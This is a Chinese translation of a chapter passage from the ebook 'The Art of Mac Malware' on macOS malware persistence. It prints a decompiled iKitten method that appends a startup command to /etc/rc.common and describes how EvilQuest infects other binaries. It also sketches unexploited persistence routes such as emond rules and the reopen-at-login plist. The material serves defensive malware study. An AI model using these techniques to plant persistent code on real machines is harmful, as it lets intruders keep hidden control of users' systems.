各种 Apple 守护进程支持第三方插件（包括认证服务、目录服务、QuickLook 和 Spotlight 的扩展）  
实现隐蔽持久化。然而需注意：macOS 的每个新版本都通过权限限制、代码签名检查、沙盒机制等安全特性持续削弱插件影响。可能因其效果日益受限，目前尚未发现真实恶意软件滥用这些插件实现持久化。  
## 2.7 脚本系统篡改（Scripts）  
  
Mac恶意软件可通过篡改系统脚本实现持久化，典型的目标是位于 /etc 目录的 rc.common 文件。在旧版macOS中，该shell脚本在系统启动过程中执行，恶意软件可插入任意命令实现开机自启。例如 iKitten 恶意软件通过名为 addToStartup 的方法滥用此文件，持久化其恶意shell脚本（脚本路径作为该方法的唯一参数传入）：  

```
-[AppDelegate addToStartup:(NSString*)item] { 
 name = [item lastPathComponent];
 cmd = [NSString stringWithFormat:@&#34;if cat /etc/rc.common | grep %@; then sleep 1; 
 else echo 'sleep %d && %@ &' >> /etc/rc.common; fi&#34;, name, 120, item]; 
 [CUtils ExecuteBash:command]; 
 ...
}
```

  
该方法构建的命令首先检查 rc.common 文件中是否已存在同名脚本，若不存在，则通过 else 分支逻辑将脚本追加至文件末尾。该命令随后通过 ExecuteBash 方法执行。  
  
其他易被篡改的脚本包括应用专属脚本，例如shell初始化脚本（如 .bashrc 或 .bash_profile ）。这些脚本在用户启动shell时自动执行。虽然篡改此类脚本可提供持久化途径，但其效果依赖于特定应用的执行频率，若用户从不启动shell，则无法触发恶意代码。  
## 2.8 事件监控规则（Event Monitor Rules）  
  
Jonathan Levin在《*OS Internals》第一卷中指出：恶意软件可能滥用事件监控守护进程（emond）实现持久化。由于操作系统在系统启动时自动运行 emond 并处理执行其规则，恶意软件只需创建符合规则的指令即可。emond规则存储于 /etc/emond.d/rules 或 /private/var/db/emondClients 目录。  
  
目前尚未发现恶意软件利用此机制。  
## 2.9 重启应用机制（Reopened Applications）  
  
Mac用户可能熟悉注销时出现的提示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibR7JUiaaUUITZfNZZLgcn5CWwkricZQErEmYXiae5MR5Carpc1ico6rSkrdvANvKftG23ypyhn5tBA44Q/640?wx_fmt=png&from=appmsg "")  
  
若勾选该复选框，macOS将在下次登录时自动重启所有运行中的应用。系统在后台将需重启的应用信息存储在 ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist 属性列表中（UUID 为硬件唯一标识符）。通过 plutil 命令可查看其内容：  

```
% plutil -p ~/Library/.../com.apple.loginwindow.151CA171-718D-592B-B37C-ABB9043C4BE2.plist
{
 &#34;TALAppsToRelaunchAtLogin&#34; => [
 0 => {
 &#34;BackgroundState&#34; => 2
 &#34;BundleID&#34; => &#34;com.apple.ichat&#34;
 &#34;Hide&#34; => 0
 &#34;Path&#34; => &#34;/System/Applications/Messages.app&#34;
 }
 1 => {
 &#34;BackgroundState&#34; => 2
 &#34;BundleID&#34; => &#34;com.google.chrome&#34;
 &#34;Hide&#34; => 0
 &#34;Path&#34; => &#34;/Applications/Google Chrome.app&#34;
 }
}
```

  
该文件包含键值对（如应用包标识符和路径），虽尚无恶意软件利用此机制，但攻击者可将自身添加至该列表，实现下次登录时自动重启。为确保持久化，恶意软件可监控此文件并在必要时重新添加自身。  
## 2.10 应用与二进制篡改（Application and Binary Modifications）  
  
隐蔽型恶意软件通过篡改受感染系统上的合法程序实现持久化，当用户启动这些程序时，恶意代码随之运行。2020年初，安全研究员 Thomas Reed 的报告揭示了针对 macOS 的广告软件 Crossrider 的复杂手段：该软件通过篡改Safari实现恶意浏览器扩展持久化。其创建修改版Safari应用，迫使用户打开浏览器时自动启用恶意扩展（无需用户操作）。随后删除该副本，使原始Safari误认为"额外安装了若干浏览器扩展"。  
  
2020年另一案例 EvilQuest 使用了多种持久化技术。该恶意软件初始通过启动项持久化，同时感染系统内多个二进制文件，即使用户删除启动项，恶意软件仍能通过感染文件保持持久化。此类病毒式持久化在macOS 上罕见，值得深入分析。EvilQuest 首次执行时生成后台线程搜索并感染其他二进制文件，相关函数包括：  

```
get_targets：生成候选目标列表
append_ei：执行感染操作
```

  
反汇编代码如下：  

```
ei_loader_thread:
0x000000010000c9a0 push rbp
0x000000010000c9a1 mov rbp, rsp
...
0x000000010000c9e0 call 1 get_targets  ; 获取目标列表
...
0x000000010000ca1a call 2 append_ei    ; 执行感染
```

  
get_targets 函数现的每个候选可执行文件被传入 append_ei 函数。后者将恶意软件副本插入目标文件头部，原始目标字节移至文件末尾，并添加包含感染标记 0xdeadface 和原始代码偏移量的尾部数据。  
  
当被感染文件执行时，恶意代码首先检查主持久化机制（启动项）是否被移除，若已移除则重建之。为避免检测，恶意代码解析文件尾部获取原始代码位置，将其写入新文件并执行。  
## 2.11 KnockKnock 工具  
  
此书作者开发了免费开源工具 KnockKnock 。该工具可以扫描本章讨论的各类持久化机制。  
  
需注意：由于合法软件通常也会持久化，KnockKnock 显示的绝大多数项目可能均为良性。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibR7JUiaaUUITZfNZZLgcn5CWEsaFHEMyIMuFT16WB4r2zfYWMXVp9mPh1iaMAsdCAaHcjmpQfEGIsPw/640?wx_fmt=png&from=appmsg "")  
## 2.12 下章预告  
  
本章探讨了 macOS 恶意软件经常滥用的持久化机制，同时分析了若干尚未被真实恶意软件采用的潜在方法。但是要整理出完整的持久化方法几乎不可能，首先Apple已弃用部分陈旧机制（如通过 StartupParameters.plist 文件），这些方法在新版macOS失效；其次Mac恶意软件作者极具创新能力，尽管我们揭示了众多技术，但往往攻击者不会只使用已知方法，他们必将寻找新的创新方式持续执行其恶意软件。  
  
若读者有兴趣深入了解持久化方法（包括已失效的历史性方法及本书出版后新发现的技术），建议探索以下资源：  
> "Persistence", MITRE ATT&CK  
> https://attack.mitre.org/tactics/TA0003/  
  
> "Beyond the good ol' LaunchAgents"  
, Theevilbit blog  
> https://theevilbit.github.io/beyond/beyond_intro/  
  
  
> "Methods of Malware Persistence on Mac OS X", Virus Bulletin  
> https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf  
  
  
下一章我们将探讨恶意软件在实现持久感染 macOS 系统后的核心目标。  
  
  
注：  
本合集为外网公开英文电子书《The Art of Mac Malware》的译文，点击阅读原文查看原版文章。因为讲MAC安全的资料相对比较少，所以翻译一下共同学习，对MAC安全感兴趣的可以关注此合集。翻译不易转载请标明出处。  
  
